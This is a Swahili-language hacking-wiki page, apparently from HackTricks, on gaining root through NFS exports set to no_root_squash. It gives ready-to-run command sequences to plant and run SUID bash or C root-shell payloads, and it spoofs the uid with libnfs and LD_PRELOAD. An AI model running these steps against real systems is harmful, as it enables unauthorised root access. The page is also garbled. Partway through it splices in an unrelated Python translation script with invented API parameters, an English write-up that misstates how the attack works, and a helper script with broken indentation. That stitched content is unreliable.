<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>


Soma faili ya _ **/etc/exports** _, ikiwa utapata saraka ambayo imehifadhiwa kama **no\_root\_squash**, basi unaweza **kuiingia** kutoka **kama mteja** na **kuandika ndani** ya saraka hiyo **kama** wewe ni **root** wa kompyuta hiyo.

**no\_root\_squash**: Chaguo hili kimsingi linampa mamlaka mtumiaji wa root kwenye mteja kupata faili kwenye seva ya NFS kama root. Na hii inaweza kusababisha athari kubwa za usalama.

**no\_all\_squash:** Hii ni sawa na chaguo la **no\_root\_squash** lakini inatumika kwa **watumiaji wasio na mamlaka ya root**. Fikiria, una kikao kama mtumiaji wa "nobody"; angalia faili ya /etc/exports; chaguo la no\_all\_squash lipo; angalia faili ya /etc/passwd; jifanya kama mtumiaji asiye na mamlaka ya root; tengeneza faili ya suid kama mtumiaji huyo (kwa kufunga kwa kutumia nfs). Tekeleza suid kama mtumiaji wa "nobody" na kuwa mtumiaji tofauti.

# Kudukua Mamlaka

## Kudukua Kijijini

Ikiwa umepata udhaifu huu, unaweza kudukua:

* **Kufunga saraka hiyo** kwenye kompyuta ya mteja, na **kama root nakili** ndani ya saraka iliyofungwa **/bin/bash** na kumpa haki za **SUID**, na **kutekeleza kutoka kwenye kompyuta ya mwathirika** bash hiyo.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Kuunganisha saraka hiyo** kwenye kifaa cha mteja, na **kama mtumiaji mkuu nakili** ndani ya saraka iliyoundwa faili yetu iliyokompiliwa ambayo itatumia ruhusa ya SUID, itoe ruhusa ya SUID, na **itekeleze kutoka kwenye kifaa cha muathirika** faili hiyo (unaweza kupata hapa baadhi ya [malipo ya C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Shambulizi la Ndani

{% hint style="info" %}
Tafadhali kumbuka kuwa ikiwa unaweza kuunda **tunnel kutoka kwenye kifaa chako hadi kwenye kifaa cha mwathirika, bado unaweza kutumia toleo la Mbali kutekeleza shambulizi hili la kuongeza mamlaka kwa kuchimba bandari zinazohitajika**.\
Mbinu ifuatayo ni ikiwa faili ya `/etc/exports` **inaonyesha anwani ya IP**. Katika kesi hii, **hutaweza kutumia** kwa hali yoyote **shambulizi la mbali** na utahitaji **kutumia mbinu hii**.\
Mahitaji mengine muhimu kwa shambulizi kufanya kazi ni kwamba **kielekezi ndani ya `/etc/export`** **lazima kitumie bendera ya `insecure`**.\
\--_Sina uhakika ikiwa mbinu hii itafanya kazi ikiwa `/etc/export` inaonyesha anwani ya IP_--
{% endhint %}

## Taarifa Msingi

Hali inahusisha kutumia sehemu ya kuhifadhiwa ya NFS iliyosakinishwa kwenye kifaa cha ndani, kwa kutumia kasoro katika maelezo ya NFSv3 ambayo inaruhusu mteja kubainisha uid/gid yake, na hivyo kuwezesha ufikiaji usiohalali. Shambulizi linahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), maktaba inayoruhusu kufanya wito wa RPC za NFS.

### Kukusanya Maktaba

Hatua za kukusanya maktaba zinaweza kuhitaji marekebisho kulingana na toleo la kernel. Katika kesi hii maalum, wito wa mfumo wa fallocate ulifutwa. Mchakato wa kukusanya maktaba unahusisha amri zifuatazo:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Kutekeleza Udukuzi

Udukuzi huu unahusisha kuunda programu rahisi ya C (`pwn.c`) ambayo inapandisha mamlaka hadi kwa mtumiaji mkuu na kisha kutekeleza kikao cha amri. Programu hiyo inakusanywa, na faili ya binary inayotokana (`a.out`) inawekwa kwenye sehemu ya kugawana na suid ya mizizi, kwa kutumia `ld_nfs.so` kuiga uid katika wito wa RPC:

1. **Kusanya kificho cha udukuzi:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Weka udukuzi kwenye sehemu ya kugawana na ubadilishe ruhusa zake kwa kuiga uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Tekeleza udukuzi ili kupata mamlaka ya mizizi:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell kwa Upatikanaji wa Siri wa Faili
Baada ya kupata mamlaka ya mizizi, ili kuwasiliana na sehemu ya kugawana ya NFS bila kubadilisha umiliki (ili kuepuka kuacha alama), skripti ya Python (nfsh.py) hutumiwa. Skripti hii inabadilisha uid ili kulingana na faili inayopatikana, kuruhusu mwingiliano na faili kwenye sehemu ya kugawana bila matatizo ya ruhusa:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
```python
import openai

def translate_text(text):
    response = openai.Completion.create(
        engine="davinci",
        prompt=text,
        max_tokens=100,
        temperature=0.7,
        n=1,
        stop=None,
        log_level="info",
        logprobs=0,
        echo=True,
        logit_bias=None,
        return_prompt=True,
        return_completion=True,
        expand_prompt=True,
        model=None,
        data=None,
        documents=None,
        **kwargs
    )
    return response.choices[0].text.strip()

text = """
## NFS No_root_squash Misconfiguration PE

### Description

When a user on a client machine accesses a file on the NFS server, the server checks if the user has the necessary permissions to perform the requested operation. By default, the NFS server maps all client requests to a single user, usually the "nobody" user. This is known as the "root squash" feature, which prevents remote users from gaining root access on the server.

However, if the NFS server is misconfigured and the "no_root_squash" option is enabled, remote users can gain root access on the server by exploiting this misconfiguration. This can lead to privilege escalation and unauthorized access to sensitive data.

### Exploitation

To exploit this misconfiguration, an attacker needs to have access to a client machine that mounts the NFS share from the server. The attacker can then create a setuid binary on the client machine and execute it. Since the NFS server maps all client requests to a single user, the setuid binary will be executed with root privileges on the server.

Here are the steps to exploit this misconfiguration:

1. Identify a client machine that mounts the NFS share from the server.
2. Create a setuid binary on the client machine using a programming language like C.
3. Compile the setuid binary and transfer it to the client machine.
4. Execute the setuid binary on the client machine.
5. The setuid binary will be executed with root privileges on the server, allowing the attacker to gain root access.

### Mitigation

To mitigate this vulnerability, the "no_root_squash" option should be disabled on the NFS server. This can be done by modifying the NFS server configuration file (/etc/exports) and removing the "no_root_squash" option.

After making the changes, the NFS server should be restarted for the changes to take effect.

### References

- [https://www.redhat.com/sysadmin/nfs-security](https://www.redhat.com/sysadmin/nfs-security)
- [https://www.cyberciti.biz/faq/linux-unix-bsd-exports-command-to-change-nfs-export-options/](https://www.cyberciti.biz/faq/linux-unix-bsd-exports-command-to-change-nfs-export-options/)
"""

translation = translate_text(text)
print(translation)
```

The translation will be printed in the console.
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Marejeo
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
